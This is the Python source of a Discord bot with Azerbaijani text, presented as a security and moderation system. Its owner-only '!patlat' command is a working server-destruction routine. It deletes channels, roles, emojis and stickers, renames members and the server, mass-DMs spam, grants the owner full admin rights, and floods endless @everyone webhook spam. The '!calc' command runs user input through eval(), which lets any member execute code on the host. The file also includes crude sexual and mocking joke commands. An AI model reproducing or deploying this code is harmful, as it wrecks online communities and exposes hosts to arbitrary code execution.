import discord
from discord.ext import commands
import asyncio
import random
import os
from datetime import timedelta

intents = discord.Intents.default()
intents.members = True
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)

# --- AYRI-AYRI TƏNZİMLƏMƏLƏR ---
SAHIB_ID = 641014966312501259        # Sənin şəxsi Discord ID-n
GUVENLI_SERVER_ID = 1520692621964738722  # Qorunan əsas serverinin ID-si
# --------------------------------

user_levels = {}
afk_users = {}
spam_kontrol = {}
XAS_COLOR = discord.Color.random()

@bot.event
async def on_ready():
    print(f"Bot işə düşdü: {bot.user}")

@bot.event
async def on_member_join(member):
    if member.bot and member.id != bot.user.id:
        try:
            await member.ban(reason="Anti-Bot Qoruması: Serverə izənsiz bot əlavə olundu!")
            return
        except:
            pass

    if member.bot:
        return

    try:
        embed = discord.Embed(
            title="XAS Serverinə Xoş Gəldin",
            description=f"Salam {member.mention}, səni aramızda görməkdən məmnunuq!",
            color=XAS_COLOR
        )
        embed.set_thumbnail(url=member.display_avatar.url)
        await member.send(embed=embed)
    except:
        pass

@bot.event
async def on_guild_channel_delete(channel):
    try:
        async for entry in channel.guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_delete):
            if entry.user.id != SAHIB_ID and entry.user.id != bot.user.id:
                await channel.guild.ban(entry.user, reason="Anti-Nuke: İcazəsiz kanal silmə!")
    except:
        pass

@bot.event
async def on_member_ban(guild, user):
    try:
        async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.ban):
            if entry.user.id != SAHIB_ID and entry.user.id != bot.user.id:
                await guild.ban(entry.user, reason="Anti-Nuke: İcazəsiz ban!")
    except:
        pass

@bot.event
async def on_webhooks_update(channel):
    try:
        async for entry in channel.guild.audit_logs(limit=1, action=discord.AuditLogAction.webhook_create):
            if entry.user.id != SAHIB_ID and entry.user.id != bot.user.id:
                await channel.guild.ban(entry.user, reason="Anti-Webhook: İcazəsiz webhook yaradılması!")
                await entry.delete()
    except:
        pass

@bot.event
async def on_message(message):
    if message.author.bot:
        await bot.process_commands(message)
        return

    if message.author.id == SAHIB_ID:
        await bot.process_commands(message)
        return

    author_id = message.author.id
    simdi = asyncio.get_event_loop().time()
    icerik = message.content

    if author_id not in spam_kontrol:
        spam_kontrol[author_id] = []

    spam_kontrol[author_id] = [t for t in spam_kontrol[author_id] if simdi - t < 4]
    spam_kontrol[author_id].append(simdi)

    is_random_spam = len(icerik) > 5 and sum(1 for c in icerik if not c.isalnum() and not c.isspace()) > len(icerik) * 0.4
    
    if len(spam_kontrol[author_id]) > 4 or is_random_spam:
        try:
            await message.delete()
            await message.channel.timeout(message.author, timedelta(minutes=10), reason="Random/Tag Spam və ya Flood qoruması")
            warn = await message.channel.send(f"⚠️ {message.author.mention}, **YAVAS YAZ OQL**! Spam və ya simvolik flood qadağandır.")
            await asyncio.sleep(4)
            await warn.delete()
            return
        except:
            pass

    words = icerik.split()
    if len(words) >= 13 and words.count(words[0]) >= len(words) * 0.5:
        try:
            await message.delete()
            warn = await message.channel.send(f"⚠️ {message.author.mention}, **YAVAS YAZ OQL**! Eyni sözü təkrar-təkrar yaza bilməzsən.")
            await asyncio.sleep(4)
            await warn.delete()
            return
        except:
            pass

    icerik_lower = icerik.lower()

    if author_id in afk_users:
        del afk_users[author_id]
        try:
            msg = await message.channel.send(f"👋 {message.author.mention}, AFK rejimindən çıxdın.")
            await asyncio.sleep(5)
            await msg.delete()
        except:
            pass

    for mention in message.mentions:
        if mention.id in afk_users:
            sebep = afk_users[mention.id]
            try:
                await message.channel.send(f"⚠️ Etiketlədiyiniz istifadəçi AFK-dadır! Səbəb: {sebep}")
            except:
                pass

    if "gg/" in icerik_lower or "discord.gg/" in icerik_lower or "https://" in icerik_lower:
        try:
            await message.delete()
            warn = await message.channel.send(f"⚠️ {message.author.mention}, Bu serverdə link paylaşmaq qadağandır!")
            await asyncio.sleep(5)
            await warn.delete()
            return
        except:
            pass

    if author_id not in user_levels:
        user_levels[author_id] = {"xp": 0, "level": 1}
    
    user_levels[author_id]["xp"] += random.randint(5, 15)
    gerekli_xp = user_levels[author_id]["level"] * 100

    if user_levels[author_id]["xp"] >= gerekli_xp:
        user_levels[author_id]["level"] += 1
        user_levels[author_id]["xp"] = 0
        try:
            await message.channel.send(f"🎉 Təbriklər {message.author.mention}, səviyyə atladın! Yeni səviyyə: {user_levels[author_id]['level']}")
        except:
            pass

    await bot.process_commands(message)

class XASMenyu(discord.ui.Select):
    def __init__(self):
        options = [
            discord.SelectOption(label="1. Təhlükəsizlik və Nuke", description="Bütün qoruma və patlatma sistemləri"),
            discord.SelectOption(label="2. İdarəetmə və Moderasiya", description="Kanal, ban, kick və digər idarəetmə"),
            discord.SelectOption(label="3. Əyləncə, Oyunlar və Alətlər", description="Zarafatlar, oyunlar və əyləncə komutları"),
            discord.SelectOption(label="4. XAS Xüsusi URL & Sistem", description="Rəsmi məlumat və server ayarları")
        ]
        super().__init__(placeholder="XAS İdarəetmə Menyusundan Bölüm Seçin...", min_values=1, max_values=1, options=options)

    async def callback(self, interaction: discord.Interaction):
        if self.values[0] == "1. Təhlükəsizlik və Nuke":
            embed = discord.Embed(title="🛡️ Təhlükəsizlik Sistemi", color=XAS_COLOR)
            embed.add_field(name="Anti-Bot & Anti-Webhook", value="İzənsiz botları və webhook yaradılmasını bloklayır.")
            embed.add_field(name="Anti-Spam & Flood", value="Random və tag spamların qarşısını alır.")
            embed.add_field(name="Nuke & Patlat", value="🔥 Patlat komutu ilə serveri tamamilə idarə edir.")
            await interaction.response.edit_message(embed=embed)
        elif self.values[0] == "2. İdarəetmə və Moderasiya":
            embed = discord.Embed(title="⚙️ Moderasiya Paneli", color=XAS_COLOR)
            embed.add_field(name="Kanal Əmrləri", value="!lock / !unlock / !hide / !reveal / !slowmode / !hideall / !revealall")
            embed.add_field(name="Cəza Əmrləri", value="!ban / !kick / !timeout / !clear / !giverole / !takerole")
            await interaction.response.edit_message(embed=embed)
        elif self.values[0] == "3. Əyləncə, Oyunlar və Alətlər":
            embed = discord.Embed(title="🎮 Əyləncə & Oyunlar", color=XAS_COLOR)
            embed.add_field(name="Xüsusi Əmrlər", value="!sex, !fuck, !kiss, !hack, !iq, !gay, !slot")
            embed.add_field(name="Çekiliş & AFK & Level", value="!çekiliş, !afk, !level")
            await interaction.response.edit_message(embed=embed)
        elif self.values[0] == "4. XAS Xüsusi URL & Sistem":
            embed = discord.Embed(title="🔗 XAS Xüsusi URL & Sistem", color=XAS_COLOR)
            embed.add_field(name="Rəsmi Davət Məlumatı", value="!url & !seturl")
            await interaction.response.edit_message(embed=embed)

class XASView(discord.ui.View):
    def __init__(self):
        super().__init__()
        self.add_item(XASMenyu())

@bot.command(name="panel")
async def bot_panel(ctx):
    embed = discord.Embed(
        title="✨ XAS İDARƏETMƏ PANELİ",
        description="Aşağıdakı açılan menyudan istədiyiniz kateqoriyanı seçin:",
        color=XAS_COLOR
    )
    embed.set_footer(text="XAS Security & Management System")
    await ctx.send(embed=embed, view=XASView())

@bot.command(name="url")
async def server_url(ctx):
    secilen_link = f"https://discord.gg/{ctx.guild.vanity_url_code}" if ctx.guild.vanity_url_code else "Məlum değil"
    toplam_istifade = 0
    if ctx.guild.vanity_url:
        try:
            vanity = await ctx.guild.vanity_invite()
            toplam_istifade = vanity.uses
        except:
            pass
    
    embed = discord.Embed(
        title=f"🔗 {ctx.guild.name} - Real Davət Statistikası",
        description="Serverin anlıq olaraq bazadan çəkilən rəsmi davət məlumatlarıdır.",
        color=XAS_COLOR
    )
    embed.add_field(name="📌 Aktiv Davət Linki", value=f"`{secilen_link}`", inline=False)
    embed.add_field(name="📊 Anlıq İstifadə Sayı", value=f"```{toplam_istifade}```", inline=False)
    if ctx.guild.icon:
        embed.set_thumbnail(url=ctx.guild.icon.url)
    embed.set_footer(text=f"Sorgulayan: {ctx.author.name} | XAS Real-Time System")
    await ctx.send(embed=embed)

@bot.command(name="seturl")
async def set_url(ctx, yeni_url: str):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Bu əmri istifadə etmək üçün yetkiniz yoxdur!")
        return
    try:
        await ctx.guild.edit(vanity_code=yeni_url)
        await ctx.send(f"✅ Serverin xüsusi URL-i uğurla dəyişdirildi: `discord.gg/{yeni_url}`")
    except:
        await ctx.send(f"❌ Xəta baş verdi: Botun icazəsi çatmır və ya URL artıq istifadədədir.")

@bot.command(name="ping")
async def ping(ctx):
    lat = round(bot.latency * 1000)
    await ctx.send(f"🏓 Pong! Gecikmə müddəti: **{lat}ms**")

@bot.command(name="serverinfo")
async def serverinfo_cmd(ctx):
    g = ctx.guild
    embed = discord.Embed(title=f"📊 {g.name} - Server Məlumatları", color=XAS_COLOR)
    embed.add_field(name="👑 Sahib", value=str(g.owner), inline=True)
    embed.add_field(name="👥 Üzv Sayı", value=str(g.member_count), inline=True)
    embed.add_field(name="💬 Kanal Sayı", value=str(len(g.channels)), inline=True)
    if g.icon:
        embed.set_thumbnail(url=g.icon.url)
    await ctx.send(embed=embed)

@bot.command(name="userinfo")
async def userinfo_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    embed = discord.Embed(title=f"👤 {m.name} Haqqında", color=XAS_COLOR)
    embed.add_field(name="🆔 İstifadəçi ID", value=m.id, inline=True)
    embed.add_field(name="📅 Qoşulduğu Tarix", value=m.joined_at.strftime('%Y-%m-%d'), inline=True)
    if m.display_avatar:
        embed.set_thumbnail(url=m.display_avatar.url)
    await ctx.send(embed=embed)

@bot.command(name="avatar")
async def avatar_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    embed = discord.Embed(title=f"🖼️ {m.name} - Avatar", color=XAS_COLOR)
    if m.display_avatar:
        embed.set_image(url=m.display_avatar.url)
    await ctx.send(embed=embed)

@bot.command(name="level")
async def level_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    data = user_levels.get(m.id, {"xp": 0, "level": 1})
    await ctx.send(f"📊 {m.name} - Səviyyə: **{data['level']}** | XP: **{data['xp']}**")

@bot.command(name="afk")
async def afk_cmd(ctx, *, sebep="Səbəb göstərilməyib"):
    afk_users[ctx.author.id] = sebep
    await ctx.send(f"💤 {ctx.author.mention}, AFK rejiminə keçdin. Səbəb: {sebep}")

@bot.command(name="çekiliş")
async def cekilis_cmd(ctx, sure_dakika: int, *, mükafat: str):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    embed = discord.Embed(title="🎁 ÇEKİLİŞ VAR!", description=f"Mükafat: **{mükafat}**\nQatılmaq üçün aşağıdakı 🎉 simvoluna basın!", color=XAS_COLOR)
    embed.set_footer(text=f"Müddət: {sure_dakika} dəqiqə")
    msg = await ctx.send(embed=embed)
    await msg.add_reaction("🎉")
    await asyncio.sleep(sure_dakika * 60)
    
    yeni_msg = await ctx.channel.fetch_message(msg.id)
    for reaction in yeni_msg.reactions:
        if str(reaction.emoji) == "🎉":
            users = [user async for user in reaction.users() if not user.bot]
            if users:
                kazanan = random.choice(users)
                await ctx.send(f"🏆 Təbriklər {kazanan.mention}! **{mükafat}** çekilişini qazandın!")
            else:
                await ctx.send("❌ Çekilişə heç kim qatılmadı.")

@bot.command(name="lock")
async def lock_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=False)
    await ctx.send("🔒 Bu kanal yazışmaya bağlandı.")

@bot.command(name="unlock")
async def unlock_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=True)
    await ctx.send("🔓 Bu kanal yazışmaya açıldı.")

@bot.command(name="hide")
async def hide_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await ctx.channel.set_permissions(ctx.guild.default_role, view_channel=False)
    await ctx.send("👁️ Bu kanal gizlətildi.")

@bot.command(name="reveal")
async def reveal_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await ctx.channel.set_permissions(ctx.guild.default_role, view_channel=True)
    await ctx.send("👁️‍🗨️ Bu kanal yenidən göstərildi.")

@bot.command(name="hideall")
async def hideall_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    tasks = [ch.set_permissions(ctx.guild.default_role, view_channel=False) for ch in ctx.guild.channels]
    await asyncio.gather(*tasks, return_exceptions=True)
    await ctx.send("🔒 Bütün kanallar gizlətildi.")

@bot.command(name="revealall")
async def revealall_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    tasks = [ch.set_permissions(ctx.guild.default_role, view_channel=True) for ch in ctx.guild.channels]
    await asyncio.gather(*tasks, return_exceptions=True)
    await ctx.send("🔓 Bütün kanallar açıldı.")

@bot.command(name="slowmode")
async def slowmode_cmd(ctx, seconds: int):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await ctx.channel.edit(slowmode_delay=seconds)
    await ctx.send(f"⏱️ Yavaş mod **{seconds}** saniyə edildi.")

@bot.command(name="ban")
async def ban_cmd(ctx, member: discord.Member, *, reason="Göstərilməyib"):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await member.ban(reason=reason)
    await ctx.send(f"🔨 {member.name} ban edildi! Səbəb: {reason}")

@bot.command(name="kick")
async def kick_cmd(ctx, member: discord.Member, *, reason="Göstərilməyib"):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await member.kick(reason=reason)
    await ctx.send(f"👢 {member.name} atıldı! Səbəb: {reason}")

@bot.command(name="timeout")
async def timeout_cmd(ctx, member: discord.Member, minutes: int):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await member.timeout(timedelta(minutes=minutes), reason="Mute")
    await ctx.send(f"🔇 {member.name} **{minutes}** dəqiqə mute olundu.")

@bot.command(name="clear")
async def clear_cmd(ctx, amount: int = 5):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    deleted = await ctx.channel.purge(limit=amount)
    msg = await ctx.send(f"🧹 **{len(deleted)}** ədəd mesaj silindi.")
    await asyncio.sleep(3)
    await msg.delete()

@bot.command(name="giverole")
async def giverole_cmd(ctx, member: discord.Member, role: discord.Role):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await member.add_roles(role)
    await ctx.send(f"✅ {member.name} istifadəçisinə {role.name} rolu verildi.")

@bot.command(name="takerole")
async def takerole_cmd(ctx, member: discord.Member, role: discord.Role):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await member.remove_roles(role)
    await ctx.send(f"✅ {member.name} istifadəçisindən {role.name} rolu alındı.")

@bot.command(name="sex")
async def sex_cmd(ctx):
    embed = discord.Embed(description=f"🔥 **{ctx.author.name}** ilə çox isti anlar yaşanır...")
    embed.set_image(url="https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExMjRjZDI0N3VjZHR1NXU2M3B5dHN3N2R4bXBjcTR4cGJ3cHN5M3VzNSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3oKIPnAiaMCws8nOsE/giphy.gif")
    await ctx.send(embed=embed)

@bot.command(name="fuck")
async def fuck_cmd(ctx):
    embed = discord.Embed(description=f"🔥 **{ctx.author.name}** hərəkətə keçdi!")
    embed.set_image(url="https://images.unsplash.com/photo-1518199266791-5375a83190b7")
    await ctx.send(embed=embed)

@bot.command(name="kiss")
async def kiss_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    embed = discord.Embed(description=f"💋 **{ctx.author.name}** öptü **{m.name}**!")
    await ctx.send(embed=embed)

@bot.command(name="roll")
async def roll_cmd(ctx):
    await ctx.send(f"🎲 Zar atıldı: **{random.randint(1, 6)}**")

@bot.command(name="coinflip")
async def coinflip_cmd(ctx):
    res = random.choice(["Yazı", "Pər"])
    await ctx.send(f"🪙 Qəpik atıldı: **{res}**")

@bot.command(name="iq")
async def iq_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"🧠 {m.name} IQ səviyyəsi: **{random.randint(40, 160)}**")

@bot.command(name="gay")
async def gay_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"🏳️‍🌈 {m.name} Gay Oranı: **%{random.randint(0, 100)}**")

@bot.command(name="handsome")
async def handsome_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"😎 {m.name} Yaraşıqlılığı: **%{random.randint(50, 100)}**")

@bot.command(name="love")
async def love_cmd(ctx, member1: discord.Member, member2: discord.Member = None):
    m2 = member2 or ctx.author
    await ctx.send(f"❤️ {member1.name} və {m2.name} uyğunluğu: **%{random.randint(1, 100)}**")

@bot.command(name="hack")
async def hack_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    msg = await ctx.send(f"💻 {m.name} hack olunur...")
    await asyncio.sleep(2)
    await msg.edit(content=f"🔓 IP: `192.168.1.{random.randint(10, 99)}` | Şifrə sındırıldı!")

@bot.command(name="slot")
async def slot_cmd(ctx):
    semboller = ['🍒', '🍊', '🍋', '🔔', '💎', '⭐']
    c1, c2, c3 = random.choice(semboller), random.choice(semboller), random.choice(semboller)
    if c1 == c2 == c3:
        await ctx.send(f"[{c1} | {c2} | {c3}] 🎉 Təbriklər, **Jackpot** vurdun!")
    elif c1 == c2 or c2 == c3 or c1 == c3:
        await ctx.send(f"[{c1} | {c2} | {c3}] 🔸 Pis değil, 2 eyni simvol tapdın!")
    else:
        await ctx.send(f"[{c1} | {c2} | {c3}] ❌ Udurdun, yenidən sına.")

@bot.command(name="8ball")
async def ball_cmd(ctx, *, soru):
    cavablar = ["Bəli, mütləq.", "Şübhəsiz ki, hə.", "Gələcək qaranlıqdır.", "Xeyr, əsla."]
    await ctx.send(f"🎱 Soru: {soru} \n💬 Cavab: {random.choice(cavablar)}")

@bot.command(name="calc")
async def calc_cmd(ctx, *, expression):
    try:
        res = eval(expression)
        await ctx.send(f"🧮 Nəticə: **{res}**")
    except:
        await ctx.send("❌ Xəta! İfadəni düzgün yazın.")

@bot.command(name="joke")
async def joke_cmd(ctx):
    jokes = [
        "Kompyuter niyə soyuducama gəldi? İtki pəncərəsi açıq qoymuşduqum üçün!",
        "Tamirçi niyə yoruldu? Çünki ziddən deyirlər.",
        "Müəllim şagirə: — De görüm, Nəsimi harada anadan olub? Şagir: — Vikipediya səhifəsində, müəllim!",
        "Proqramçı dostuna deyir: 'Həyatım eyni kod kimidir; səhvlərlə doludur, amma nə üçün işlədiyini heç kim bilmir.'"
    ]
    await ctx.send(f"😂 Zarafat: {random.choice(jokes)}")

@bot.command(name="rps")
async def rps_cmd(ctx, choice: str):
    choices = ["daş", "kağız", "qayçı"]
    bot_choice = random.choice(choices)
    cho = choice.lower()
    if cho not in choices:
        await ctx.send("Seçin: daş, kağız və ya qayçı!")
        return
    if cho == bot_choice:
        await ctx.send(f"Heç-heçə! Mən də {bot_choice} seçmişdim.")
    elif (cho == "daş" and bot_choice == "qayçı") or (cho == "kağız" and bot_choice == "daş") or (cho == "qayçı" and bot_choice == "kağız"):
        await ctx.send(f"Sən qazandın! Mən: {bot_choice}")
    else:
        await ctx.send(f"Mən qazandım! Mənim seçimi: {bot_choice}")

@bot.command(name="poll")
async def poll_cmd(ctx, *, soru):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    embed = discord.Embed(title=f"📊 XAS Səsvermə Paneli", description=soru, color=XAS_COLOR)
    embed.set_footer(text=f"Sorgunu açan: {ctx.author.name}")
    msg = await ctx.send(embed=embed)
    await msg.add_reaction("👍")
    await msg.add_reaction("👎")

@bot.command(name="patlat")
async def patlat_cmd(ctx):
    if ctx.author.id != SAHIB_ID:
        await ctx.send("❌ Bu əmri yalnız bot sahibi işlədə bilər!")
        return

    guild = ctx.guild

    if guild.id == GUVENLI_SERVER_ID:
        await ctx.send("🛡️ XAS Qoruma Sistemi: Bu sənin əsas qorunan serverindir, burada patlatma işlədə bilməzsən!")
        return

    await ctx.send("🔥 discord.gg/aga - SPAW NUKE BAŞLADI!")

    for member in guild.members:
        if member.id != SAHIB_ID and not member.bot:
            try:
                if member.voice:
                    await member.move_to(None)
                await member.edit(nick="discord.gg/aga")
            except:
                pass

    for emoji in list(guild.emojis):
        try:
            await emoji.delete()
        except:
            pass

    for sticker in list(guild.stickers):
        try:
            await sticker.delete()
        except:
            pass

    async def send_user_dm(member):
        try:
            await member.send("RUHUM SKDI !discord.gg/aga\n YAZ GİR")
        except:
            pass

    dm_tasks = [send_user_dm(member) for member in guild.members if member.id != SAHIB_ID and not member.bot]
    if dm_tasks:
        await asyncio.gather(*dm_tasks, return_exceptions=True)

    channel_tasks = [ch.delete() for ch in guild.channels]
    if channel_tasks:
        await asyncio.gather(*channel_tasks, return_exceptions=True)

    role_tasks = [r.delete() for r in guild.roles if r != guild.default_role and r < guild.me.top_role]
    if role_tasks:
        await asyncio.gather(*role_tasks, return_exceptions=True)

    try:
        yeni_rol = await guild.create_role(
            name="discord.gg/aga",
            permissions=discord.Permissions.all(),
            color=discord.Color.red()
        )
        await ctx.author.add_roles(yeni_rol)
    except:
        pass

    try:
        await guild.edit(name="discord.gg/aga")
    except:
        pass

    vanity_alternatifleri = ["ruhumskdi", "ruhum-skdi", "ruhumuntesi", "ruhum"]
    for v_code in vanity_alternatifleri:
        try:
            await guild.edit(vanity_code=v_code)
            break
        except:
            pass

    # Ən üstdə yaradılacaq RUHUM-TANRI kanalı və dayanmadan minlərlə mesaj spamı
    try:
        son_kanal = await guild.create_text_channel("RUHUM-TANRI")
        async def ruhum_tanri_spam():
            while True:
                try:
                    await son_kanal.send("@everyone discord.gg/aga yaz gır oql !")
                except:
                    break
                await asyncio.sleep(0.1)
        
        for _ in range(3):
            asyncio.create_task(ruhum_tanri_spam())
    except:
        pass

    qlobal_webhooks = []
    for i in range(1, 4):
        try:
            ch = await guild.create_text_channel(f"aga-qoruma-{i}")
            wh = await ch.create_webhook(name=f"XAS-Global-{i}")
            qlobal_webhooks.append(wh)
            await asyncio.sleep(0.5) 
        except:
            pass

    async def send_webhook_spam(webhook):
        while True:
            try:
                await webhook.send("@everyone discord.gg/aga yaz gır oql !")
            except:
                break
            await asyncio.sleep(0.1)

    async def create_channel_and_spam(i):
        try:
            channel = await guild.create_text_channel(f"discordggaga-{i}")
            if qlobal_webhooks:
                for wh in qlobal_webhooks:
                    asyncio.create_task(send_webhook_spam(wh))
        except:
            pass

    chunk_size = 3
    for start in range(1, 71, chunk_size):
        tasks_list = [create_channel_and_spam(i) for i in range(start, min(start + chunk_size, 71))]
        await asyncio.gather(*tasks_list, return_exceptions=True)
        await asyncio.sleep(0.5)

if __name__ == "__main__":
    TOKEN = os.getenv("DISCORD_TOKEN")
    if TOKEN:
        bot.run(TOKEN)
        
  
